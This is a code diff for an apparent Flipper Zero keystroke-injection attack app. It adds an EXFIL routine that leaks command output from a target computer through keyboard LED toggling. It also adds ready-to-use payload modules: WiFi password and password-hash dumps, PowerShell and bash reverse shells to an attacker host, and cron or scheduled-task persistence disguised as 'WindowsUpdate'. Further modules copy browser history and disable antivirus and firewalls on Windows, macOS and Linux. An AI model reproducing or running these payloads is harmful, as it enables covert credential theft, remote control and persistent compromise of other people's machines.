@@ -734,6 +734,182 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- EXFIL <command> ----
+     * Types <command> on the target, appends a platform-specific one-liner that
+     * transmits the command's output back via CapsLock/NumLock LED toggling:
+     *   - CapsLock encodes each data bit (MSB first)
+     *   - NumLock is toggled once per bit as a clock signal
+     *   - Byte 0x04 (EOT) signals end of transmission
+     * Flipper polls furi_hal_hid_get_led_state() at 2 ms intervals to capture
+     * each bit on every NumLock edge. */
+    if(strncmp(line, "EXFIL ", 6) == 0) {
+        const char* cmd = line + 6;
+        FPwnOS os = fpwn_effective_os(app);
+
+        /* Allocate receive buffer if not already present */
+        if(!app->exfil_buffer) {
+            app->exfil_buffer = malloc(FPWN_EXFIL_MAX);
+            app->exfil_capacity = FPWN_EXFIL_MAX;
+        }
+        app->exfil_len = 0;
+        memset(app->exfil_buffer, 0, app->exfil_capacity);
+
+        /* Phase 1: type the data-gathering command, pipe into exfil transmitter */
+        fpwn_type_string(cmd);
+
+        if(os == FPwnOSWindows) {
+            /* PowerShell: capture → encode → transmit via CapsLock/NumLock */
+            fpwn_type_string(" | Out-String | Set-Variable -Name _fpd; "
+                             "$_w=New-Object -Com WScript.Shell; "
+                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes("
+                             "($_fpd+[char]4)); "
+                             "foreach($_c in $_b){"
+                             "for($_i=7;$_i -ge 0;$_i--){"
+                             "$_v=($_c -shr $_i) -band 1; "
+                             "if($_v -eq 1 -and !([Console]::CapsLock)){"
+                             "$_w.SendKeys('{CAPSLOCK}')} "
+                             "elseif($_v -eq 0 -and [Console]::CapsLock){"
+                             "$_w.SendKeys('{CAPSLOCK}')}; "
+                             "Start-Sleep -m 30; "
+                             "$_w.SendKeys('{NUMLOCK}'); "
+                             "Start-Sleep -m 30"
+                             "}}");
+        } else if(os == FPwnOSLinux) {
+            /* Bash + xdotool: capture → transmit bit by bit */
+            fpwn_type_string(" > /tmp/.fpd 2>&1; "
+                             "_d=$(cat /tmp/.fpd; printf '\\x04'); "
+                             "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
+                             "_b=$((16#$_c)); "
+                             "for _i in $(seq 7 -1 0); do "
+                             "_v=$(( (_b>>_i)&1 )); "
+                             "if [ $_v -eq 1 ]; then "
+                             "xdotool key Caps_Lock; fi; "
+                             "sleep 0.03; "
+                             "xdotool key Num_Lock; "
+                             "sleep 0.03; "
+                             "done; done; rm -f /tmp/.fpd");
+        } else if(os == FPwnOSMac) {
+            /* macOS: osascript for key simulation */
+            fpwn_type_string(
+                " > /tmp/.fpd 2>&1; "
+                "_d=$(cat /tmp/.fpd; printf '\\x04'); "
+                "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
+                "_b=$((16#$_c)); "
+                "for _i in $(seq 7 -1 0); do "
+                "_v=$(( (_b>>_i)&1 )); "
+                "if [ $_v -eq 1 ]; then "
+                "osascript -e 'tell application \"System Events\" to key code 57'; fi; "
+                "sleep 0.03; "
+                "osascript -e 'tell application \"System Events\" to key code 71'; "
+                "sleep 0.03; "
+                "done; done; rm -f /tmp/.fpd");
+        }
+
+        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+
+        /* Phase 2: small settling delay before we start polling */
+        furi_delay_ms(2000);
+
+        /* Phase 3: LED polling receiver — runs until EOT or 10 s timeout */
+        FURI_LOG_I(TAG, "EXFIL: entering receive mode");
+
+        {
+            FPwnExecModel* m = (FPwnExecModel*)view_get_model(app->execute_view);
+            strncpy(m->status, "Receiving data...", sizeof(m->status) - 1);
+            view_commit_model(app->execute_view, true);
+        }
+
+        uint8_t prev_led = furi_hal_hid_get_led_state();
+        uint8_t current_byte = 0;
+        uint8_t bit_count = 0;
+        uint32_t last_clock = furi_get_tick();
+        bool receiving = true;
+
+        while(receiving && !app->abort_requested) {
+            uint8_t led = furi_hal_hid_get_led_state();
+
+            /* NumLock transition = clock edge; CapsLock = data bit */
+            if((led ^ prev_led) & HID_KB_LED_NUM) {
+                uint8_t data_bit = (led & HID_KB_LED_CAPS) ? 1 : 0;
+                current_byte = (current_byte << 1) | data_bit;
+                bit_count++;
+                last_clock = furi_get_tick();
+
+                if(bit_count == 8) {
+                    if(current_byte == 0x04) {
+                        /* EOT — end of transmission */
+                        FURI_LOG_I(TAG, "EXFIL: EOT, %lu bytes", (unsigned long)app->exfil_len);
+                        receiving = false;
+                    } else if(app->exfil_len < app->exfil_capacity - 1) {
+                        app->exfil_buffer[app->exfil_len++] = (char)current_byte;
+                        app->exfil_buffer[app->exfil_len] = '\0';
+                    }
+                    current_byte = 0;
+                    bit_count = 0;
+                }
+            }
+
+            prev_led = led;
+
+            /* Timeout: 10 seconds of silence = abort */
+            if(furi_get_tick() - last_clock > furi_ms_to_ticks(10000)) {
+                FURI_LOG_W(TAG, "EXFIL: timeout, %lu bytes", (unsigned long)app->exfil_len);
+                receiving = false;
+            }
+
+            furi_delay_ms(2); /* 2 ms poll — fast enough for 30 ms clock period */
+        }
+
+        /* Restore CapsLock to its pre-exfil state if the target script left it dirty */
+        {
+            uint8_t final_led = furi_hal_hid_get_led_state();
+            if((final_led ^ prev_led) & HID_KB_LED_CAPS) {
+                furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+                furi_delay_ms(2);
+                furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+            }
+        }
+
+        /* Phase 4: save received data to SD card */
+        if(app->exfil_len > 0) {
+            storage_simply_mkdir(app->storage, FPWN_EXFIL_DIR);
+
+            char exfil_path[128];
+            uint32_t ts = furi_get_tick() / 1000;
+            snprintf(
+                exfil_path,
+                sizeof(exfil_path),
+                "%s/exfil_%lu.txt",
+                FPWN_EXFIL_DIR,
+                (unsigned long)ts);
+
+            File* ef = storage_file_alloc(app->storage);
+            if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
+                storage_file_close(ef);
+                FURI_LOG_I(
+                    TAG, "EXFIL: saved %lu bytes to %s", (unsigned long)app->exfil_len, exfil_path);
+            }
+            storage_file_free(ef);
+
+            FPwnExecModel* m = (FPwnExecModel*)view_get_model(app->execute_view);
+            snprintf(
+                m->status,
+                sizeof(m->status),
+                "Exfil: %lu bytes saved",
+                (unsigned long)app->exfil_len);
+            view_commit_model(app->execute_view, true);
+        } else {
+            FPwnExecModel* m = (FPwnExecModel*)view_get_model(app->execute_view);
+            strncpy(m->status, "Exfil: no data received", sizeof(m->status) - 1);
+            view_commit_model(app->execute_view, true);
+        }
+
+        return;
+    }
+
     FURI_LOG_W(TAG, "Unrecognised command: %s", line);
 }
 
@@ -1100,6 +1276,16 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                 storage_file_write(gf, buf, (uint16_t)strlen(buf));
             }
 
+            /* Append any exfiltrated data captured during this run */
+            if(app->exfil_buffer && app->exfil_len > 0) {
+                const char* exfil_hdr = "\nExfiltrated Data\n----------------\n";
+                storage_file_write(gf, exfil_hdr, (uint16_t)strlen(exfil_hdr));
+                uint16_t wlen = (uint16_t)(app->exfil_len > 2048 ? 2048 : app->exfil_len);
+                storage_file_write(gf, app->exfil_buffer, wlen);
+                const char* nl = "\n";
+                storage_file_write(gf, nl, 1);
+            }
+
             /* If LHOST + LPORT are present, write MSF listener command */
             const char* lhost = NULL;
             const char* lport = NULL;
@@ -1254,10 +1440,10 @@ static const char SAMPLE_ATTACK_CHAIN[] =
     "DELAY 1500\n"
     "CTRL ALT l\n";
 
-/* Browser Credential Dump — extracts saved WiFi passwords */
+/* WiFi Credential Dump — extracts saved WiFi passwords and exfils via LED */
 static const char SAMPLE_WIFI_CREDS[] =
     "NAME WiFi Credential Dump\n"
-    "DESCRIPTION Extracts saved WiFi passwords from the system\n"
+    "DESCRIPTION Extracts saved WiFi passwords; exfils output via LED toggling\n"
     "CATEGORY credential\n"
     "PLATFORMS WIN,MAC,LINUX\n"
     "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
@@ -1268,8 +1454,7 @@ static const char SAMPLE_WIFI_CREDS[] =
     "STRING powershell -nop -ep bypass\n"
     "ENTER\n"
     "DELAY 1200\n"
-    "STRING (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$n\" key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
-    "ENTER\n"
+    "EXFIL (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$n\" key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
     "PLATFORM MAC\n"
     "DELAY {{DELAY}}\n"
     "GUI SPACE\n"
@@ -1277,19 +1462,17 @@ static const char SAMPLE_WIFI_CREDS[] =
     "STRING Terminal\n"
     "ENTER\n"
     "DELAY 1400\n"
-    "STRING for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); echo \"WIFI: $ssid = $pw\"; done\n"
-    "ENTER\n"
+    "EXFIL for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); echo \"WIFI: $ssid = $pw\"; done\n"
     "PLATFORM LINUX\n"
     "DELAY {{DELAY}}\n"
     "CTRL ALT t\n"
     "DELAY 1400\n"
-    "STRING sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | sed 's/:/: /' \n"
-    "ENTER\n";
+    "EXFIL sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | sed 's/:/: /'\n";
 
-/* SAM/Shadow Dump — extracts password hashes */
+/* SAM/Shadow Dump — extracts password hashes and exfils via LED */
 static const char SAMPLE_HASH_DUMP[] =
     "NAME Hash Dump\n"
-    "DESCRIPTION Extracts OS password hashes (requires admin/root)\n"
+    "DESCRIPTION Extracts OS password hashes (requires admin/root); exfils via LED\n"
     "CATEGORY credential\n"
     "PLATFORMS WIN,MAC,LINUX\n"
     "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
@@ -1297,7 +1480,38 @@ static const char SAMPLE_HASH_DUMP[] =
     "DELAY {{DELAY}}\n"
     "GUI r\n"
     "DELAY 800\n"
-    "STRING powershell -nop -ep bypass Start-Process powershell -Verb RunAs -ArgumentList '-nop -ep bypass -c \"reg save HKLM\\SAM $env:TEMP\\s.hiv /y; reg save HKLM\\SYSTEM $env:TEMP\\y.hiv /y; Write-Host SAM+SYSTEM saved to $env:TEMP\"'\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL reg save HKLM\\SAM $env:TEMP\\s.hiv /y 2>&1; reg save HKLM\\SYSTEM $env:TEMP\\y.hiv /y 2>&1; Write-Output \"SAM+SYSTEM saved to $env:TEMP\"\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL sudo dscl . -readall /Users UniqueID RealName AuthenticationAuthority 2>/dev/null | head -60\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL sudo cat /etc/shadow 2>/dev/null | head -20\n";
+
+/* Reverse Shell — cross-platform TCP reverse shell via HID */
+static const char SAMPLE_REVERSE_SHELL[] =
+    "NAME Reverse Shell\n"
+    "DESCRIPTION Opens a reverse shell to the attacker's listener\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION LHOST 192.168.1.100 \"Attacker IP address\"\n"
+    "OPTION LPORT 4444 \"Listener port\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\n"
     "ENTER\n"
     "PLATFORM MAC\n"
     "DELAY {{DELAY}}\n"
@@ -1306,13 +1520,121 @@ static const char SAMPLE_HASH_DUMP[] =
     "STRING Terminal\n"
     "ENTER\n"
     "DELAY 1400\n"
-    "STRING sudo dscl . -readall /Users UniqueID RealName AuthenticationAuthority 2>/dev/null | head -60\n"
+    "STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING exit\n"
     "ENTER\n"
     "PLATFORM LINUX\n"
     "DELAY {{DELAY}}\n"
     "CTRL ALT t\n"
     "DELAY 1400\n"
-    "STRING sudo cat /etc/shadow 2>/dev/null | head -20\n"
+    "STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING exit\n"
+    "ENTER\n";
+
+/* Persistence — installs a scheduled task/cron callback every 15 minutes */
+static const char SAMPLE_PERSISTENCE[] =
+    "NAME Persistence Install\n"
+    "DESCRIPTION Creates a persistent callback to the attacker\n"
+    "CATEGORY post\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION LHOST 192.168.1.100 \"Attacker IP address\"\n"
+    "OPTION LPORT 4444 \"Callback port\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -w hidden -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING $a='powershell -nop -w hidden -ep bypass -c \"while(1){try{$c=New-Object Net.Sockets.TCPClient(''{{LHOST}}'',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 60}}\"';schtasks /create /sc minute /mo 15 /tn 'WindowsUpdate' /tr $a /f\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING (crontab -l 2>/dev/null; echo \"*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1\") | crontab -\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING exit\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING (crontab -l 2>/dev/null; echo \"*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1\") | crontab -\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING exit\n"
+    "ENTER\n";
+
+/* Browser History — extracts recent history from Chrome/Safari/Firefox via sqlite3 */
+static const char SAMPLE_BROWSER_HISTORY[] =
+    "NAME Browser History Dump\n"
+    "DESCRIPTION Extracts recent browser history from Chrome/Safari/Firefox\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "OPTION COUNT 50 \"Number of recent entries to extract\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING $h=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\";$t=\"$env:TEMP\\h.db\";Copy-Item $h $t -Force 2>$null;Add-Type -Path \"$env:LOCALAPPDATA\\..\\Roaming\\..\\Local\\Microsoft\\WindowsApps\\Microsoft.Winget.Source_*\\SQLite\\System.Data.SQLite.dll\" 2>$null;try{$c=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$t\");$c.Open();$q=$c.CreateCommand();$q.CommandText=\"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\";$r=$q.ExecuteReader();while($r.Read()){Write-Host $r[0] $r[1]};$c.Close()}catch{Write-Host 'Chrome history unavailable'}\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING cp ~/Library/Application\\ Support/Google/Chrome/Default/History /tmp/h.db 2>/dev/null && sqlite3 /tmp/h.db \"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\"; rm -f /tmp/h.db\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING cp ~/.config/google-chrome/Default/History /tmp/h.db 2>/dev/null && sqlite3 /tmp/h.db \"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\"; rm -f /tmp/h.db\n"
+    "ENTER\n";
+
+/* Disable Defenses — disables AV/firewall on all three platforms (requires admin/root) */
+static const char SAMPLE_DISABLE_DEFENDER[] =
+    "NAME Disable Defenses\n"
+    "DESCRIPTION Disables AV/firewall (requires admin/root)\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass Start-Process powershell -Verb RunAs -ArgumentList '-nop -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host Defenses disabled\"'\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING sudo pfctl -d 2>/dev/null; sudo spctl --master-disable 2>/dev/null; echo Defenses disabled\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING sudo systemctl stop firewalld 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo Defenses disabled\n"
     "ENTER\n";
 
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
@@ -1349,4 +1671,16 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/hash_dump.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_HASH_DUMP);
+
+    snprintf(path, sizeof(path), "%s/reverse_shell.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_REVERSE_SHELL);
+
+    snprintf(path, sizeof(path), "%s/persistence.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PERSISTENCE);
+
+    snprintf(path, sizeof(path), "%s/browser_history.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_BROWSER_HISTORY);
+
+    snprintf(path, sizeof(path), "%s/disable_defender.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_DISABLE_DEFENDER);
 }
